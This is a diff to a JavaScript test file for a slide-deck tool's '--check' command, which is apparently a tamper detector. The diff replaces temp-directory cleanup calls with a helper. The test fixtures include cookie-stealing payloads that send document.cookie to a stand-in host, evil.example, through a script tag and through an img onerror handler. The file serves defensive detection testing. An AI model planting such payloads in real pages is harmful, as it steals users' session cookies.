@@ -12,6 +12,7 @@ import assert from 'node:assert/strict';
 import { execFileSync } from 'node:child_process';
 import { readFileSync, writeFileSync, mkdtempSync, rmSync } from 'node:fs';
 import { tmpdir } from 'node:os';
+import { rmTemp } from './helpers.mjs';
 import path from 'node:path';
 import { fileURLToPath } from 'node:url';
 
@@ -300,7 +301,7 @@ test('--check exits 0 on a deck that runs only the runtime', () => {
   const installed = installedRuntime();
   writeFileSync(deck, `<div class="decklight"></div><script>${installed.text}</script><script>Decklight.init()</script>`);
   const { code, out } = run(['present', '--check', deck]);
-  rmSync(dir, { recursive: true, force: true });
+  rmTemp(dir);
   assert.equal(code, 0);
   assert.match(out, /identical to this install/);
   assert.match(out, /0 unaccounted/);
@@ -315,7 +316,7 @@ test('--check exits non-zero and names the block, from any directory', () => {
   writeFileSync(deck, `<script>var Decklight = {}</script><script>Decklight.init()</script>
 <script>fetch("//evil.example/" + document.cookie)</script>`);
   const { code, out } = run(['present', '--check', deck]);
-  rmSync(dir, { recursive: true, force: true });
+  rmTemp(dir);
   assert.equal(code, 1);
   assert.match(out, /1 unaccounted script block/);
   assert.match(out, /line\s+2\s+.*evil\.example/);
@@ -329,7 +330,7 @@ test('--check exits non-zero on an inline handler, even with 0 unaccounted block
   writeFileSync(deck, `<script>var Decklight = {}</script><script>Decklight.init()</script>
 <img src=x onerror="fetch('//evil.example/' + document.cookie)">`);
   const { code, out } = run(['present', '--check', deck]);
-  rmSync(dir, { recursive: true, force: true });
+  rmTemp(dir);
   assert.equal(code, 1);
   assert.match(out, /0 unaccounted script blocks/, 'the block count is honest — there is no block');
   assert.match(out, /1 executable attribute/);
@@ -348,7 +349,7 @@ test('--check on a real bundled deck is quiet, and loud once tampered with', () 
 
   writeFileSync(deck, readFileSync(deck, 'utf8') + '\n<script>alert(1)</script>\n');
   const after = run(['present', '--check', deck]);
-  rmSync(dir, { recursive: true, force: true });
+  rmTemp(dir);
   assert.equal(after.code, 1);
   assert.match(after.out, /alert\(1\)/);
 });
